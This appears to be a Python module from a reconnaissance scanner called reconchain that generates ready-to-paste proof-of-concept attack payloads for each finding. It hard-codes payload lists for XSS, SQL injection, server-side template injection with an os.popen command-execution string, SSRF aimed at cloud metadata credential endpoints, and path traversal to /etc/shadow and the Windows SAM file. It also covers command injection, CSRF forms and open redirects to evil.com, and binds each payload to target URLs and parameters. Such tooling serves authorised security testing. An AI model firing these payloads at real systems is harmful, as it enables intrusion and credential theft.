"""Auto-PoC generation for confirmed vulnerabilities.

Generates ready-to-paste proof-of-concept payloads for each
vulnerability type found during scanning.
"""
from __future__ import annotations

import json
import re
from pathlib import Path
from typing import Any, Dict, List, Optional

from reconchain.utils import ensure, log, read_lines


# ── PoC templates by vulnerability type ──────────────────────────────────────

_XSS_PAYLOADS = [
    '<script>alert(document.domain)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '"><script>alert(1)</script>',
    "';alert(1)//",
    '<iframe src="javascript:alert(1)">',
    '<body onload=alert(1)>',
    '{{constructor.constructor("alert(1)")()}}',
]

_SSRF_PAYLOADS = [
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance',
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://localhost:8080/',
    'http://[::1]:80/',
]

_SSTI_PAYLOADS = [
    '{{7*7}}',
    '${7*7}',
    '<%= 7*7 %>',
    '#{7*7}',
    '{{config.items()}}',
    '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
]

_SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    "1; WAITFOR DELAY '0:0:5'--",
    "' AND SLEEP(5)--",
    "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
]

_LFI_PAYLOADS = [
    '../../../../etc/passwd',
    '../../../../etc/shadow',
    '..\\..\\..\\..\\windows\\system32\\config\\sam',
    '/proc/self/environ',
    'php://filter/convert.base64-encode/resource=index.php',
    '....//....//....//....//etc/passwd',
]

_OPEN_REDIRECT_PAYLOADS = [
    'https://evil.com',
    '//evil.com',
    '///evil.com',
    '/\\evil.com',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
]

_IDOR_PAYLOADS = [
    'Change ID from current to: {id_minus_1}',
    'Try sequential IDs: 1, 2, 3, ...',
    'Try UUID format if applicable',
    'Check for predictable patterns in the ID',
]

_CSRF_PAYLOADS = [
    '<form method="POST" action="{url}"><input type="hidden" name="param" value="evil"><input type="submit"></form>',
    '<img src="{url}?param=evil">',
    'fetch("{url}", {method: "POST", body: "param=evil", credentials: "include"})',
]

_CRLF_PAYLOADS = [
    '%0d%0aInjected-Header:true',
    '%0D%0AX-Injected:true',
    '\\r\\nX-Injected:true',
]

_RCE_PAYLOADS = [
    ';id',
    '|id',
    '$(id)',
    '`id`',
    '||id||',
    '%0aid%0a',
]

_CONTENT_TYPE_BYPASS = [
    'application/x-www-form-urlencoded',
    'multipart/form-data',
    'application/json',
    'text/xml',
]


def _extract_url_from_finding(finding: str) -> Optional[str]:
    """Extract a URL from a finding text line."""
    match = re.search(r'https?://[^\s<>"\']+', finding)
    return match.group(0) if match else None


def _extract_param_from_finding(finding: str) -> Optional[str]:
    """Extract a parameter name from a finding."""
    match = re.search(r'[?&](\w+)=', finding)
    return match.group(1) if match else None


def generate_pocs(finding: str, vuln_type: str) -> List[Dict[str, str]]:
    """Generate PoC payloads for a finding based on its vulnerability type."""
    pocs: List[Dict[str, str]] = []
    url = _extract_url_from_finding(finding)
    param = _extract_param_from_finding(finding)

    if vuln_type in ("xss", "stored_xss"):
        for payload in _XSS_PAYLOADS:
            pocs.append({
                "type": "XSS",
                "payload": payload,
                "delivery": f"Inject into parameter: {param}" if param else "Inject into vulnerable field",
                "url": url or "(URL from finding)",
            })

    elif vuln_type == "ssrf":
        for payload in _SSRF_PAYLOADS:
            pocs.append({
                "type": "SSRF",
                "payload": payload,
                "delivery": f"Set parameter {param} to: {payload}" if param else f"Set URL to: {payload}",
                "url": url or "(URL from finding)",
            })

    elif vuln_type == "ssti":
        for payload in _SSTI_PAYLOADS:
            pocs.append({
                "type": "SSTI",
                "payload": payload,
                "delivery": f"Inject into template parameter: {param}" if param else "Inject into template",
                "url": url or "(URL from finding)",
            })

    elif vuln_type == "sqli":
        for payload in _SQLI_PAYLOADS:
            pocs.append({
                "type": "SQLi",
                "payload": payload,
                "delivery": f"Append to parameter {param}" if param else "Append to input field",
                "url": url or "(URL from finding)",
            })

    elif vuln_type == "lfi":
        for payload in _LFI_PAYLOADS:
            pocs.append({
                "type": "LFI",
                "payload": payload,
                "delivery": f"Replace file path in parameter {param}" if param else "Replace file path",
                "url": url or "(URL from finding)",
            })

    elif vuln_type == "open_redirect":
        for payload in _OPEN_REDIRECT_PAYLOADS:
            pocs.append({
                "type": "Open Redirect",
                "payload": payload,
                "delivery": f"Set redirect parameter to: {payload}",
                "url": url or "(URL from finding)",
            })

    elif vuln_type == "idor":
        for payload in _IDOR_PAYLOADS:
            pocs.append({
                "type": "IDOR",
                "payload": payload,
                "delivery": "Modify ID parameter in request",
                "url": url or "(URL from finding)",
            })

    elif vuln_type == "csrf":
        for payload_template in _CSRF_PAYLOADS:
            payload = payload_template.format(url=url or "TARGET_URL")
            pocs.append({
                "type": "CSRF",
                "payload": payload,
                "delivery": "Host on attacker-controlled page",
                "url": url or "(URL from finding)",
            })

    elif vuln_type == "crlf":
        for payload in _CRLF_PAYLOADS:
            pocs.append({
                "type": "CRLF",
                "payload": payload,
                "delivery": f"Inject into parameter {param}" if param else "Inject CRLF sequence",
                "url": url or "(URL from finding)",
            })

    elif vuln_type == "rce":
        for payload in _RCE_PAYLOADS:
            pocs.append({
                "type": "RCE",
                "payload": payload,
                "delivery": f"Append to parameter {param}" if param else "Append to command input",
                "url": url or "(URL from finding)",
            })

    elif vuln_type in ("cors", "cors_misconfig"):
        pocs.append({
            "type": "CORS",
            "payload": "Origin: https://evil.com",
            "delivery": "Send request with attacker-controlled Origin header",
            "url": url or "(URL from finding)",
        })

    elif vuln_type in ("jwt",):
        pocs.append({
            "type": "JWT",
            "payload": "Change algorithm to 'none' or 'HS256' with known secret",
            "delivery": "Decode JWT, modify claims, re-encode",
            "url": url or "(URL from finding)",
        })

    elif vuln_type in ("info_leak", "secrets"):
        pocs.append({
            "type": "Info Leak",
            "payload": "Direct access to sensitive endpoint",
            "delivery": "Navigate to the exposed URL directly",
            "url": url or "(URL from finding)",
        })

    else:
        pocs.append({
            "type": vuln_type.upper() if vuln_type else "UNKNOWN",
            "payload": finding,
            "delivery": "Manual testing required",
            "url": url or "(URL from finding)",
        })

    return pocs


def generate_all_pocs(outdir: Path) -> Path:
    """Generate PoCs for all findings and write to outdir/poc/."""
    from reconchain.artifacts import ARTIFACTS

    poc_dir = ensure(outdir / "poc")
    all_pocs: Dict[str, List[Dict[str, str]]] = {}
    total = 0

    for art in ARTIFACTS:
        if not art.vuln_type:
            continue
        p = outdir / art.filename
        if not p.exists():
            continue

        file_pocs: List[Dict[str, str]] = []
        for line in read_lines(p):
            text = line.strip()
            if not text:
                continue
            pocs = generate_pocs(text, art.vuln_type)
            for poc in pocs:
                poc["finding"] = text
                poc["source"] = art.display_name
            file_pocs.extend(pocs)

        if file_pocs:
            all_pocs[art.key] = file_pocs
            total += len(file_pocs)

            # Write per-artifact PoC file
            poc_file = poc_dir / f"poc_{art.key}.json"
            poc_file.write_text(json.dumps(file_pocs, indent=2, default=str))

    # Write combined PoC file
    combined = poc_dir / "all_pocs.json"
    combined.write_text(json.dumps(all_pocs, indent=2, default=str))

    # Write summary
    summary_lines = ["# Auto-Generated Proof-of-Concept Payloads\n"]
    for key, pocs in all_pocs.items():
        summary_lines.append(f"\n## {key} ({len(pocs)} PoCs)\n")
        seen = set()
        for poc in pocs[:10]:  # Limit per type
            payload_key = (poc["type"], poc["payload"])
            if payload_key in seen:
                continue
            seen.add(payload_key)
            summary_lines.append(f"### {poc['type']}")
            summary_lines.append(f"**Payload:** `{poc['payload']}`")
            summary_lines.append(f"**Delivery:** {poc['delivery']}")
            if poc.get("url"):
                summary_lines.append(f"**URL:** `{poc['url']}`")
            summary_lines.append("")

    summary_file = poc_dir / "poc_summary.md"
    summary_file.write_text("\n".join(summary_lines))

    log("ok", f"Auto-PoC: {total} payloads generated in {poc_dir}")
    return poc_dir
